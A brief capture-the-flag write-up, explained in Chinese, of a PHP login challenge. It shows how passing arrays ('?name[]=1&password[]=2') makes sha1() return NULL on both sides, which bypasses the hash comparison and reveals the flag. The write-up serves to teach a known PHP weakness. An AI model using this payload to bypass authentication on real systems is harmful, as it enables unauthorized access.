# Challenge 
```php
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
?>
```
# Solution
输入的name和password不能一样，之后的sha1比较用了`===`，不存在弱类型问题。但sha1不能处理数组，当我们传入`name[]=1&password[]=2`时，会造成`sha1(Array) === sha1(Array)`，即`NULL===NULL`，从而吐出flag

payload:
```
?name[]=1&password[]=2
```

# Refference
+ [chybeta : FALSE](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#Once-More)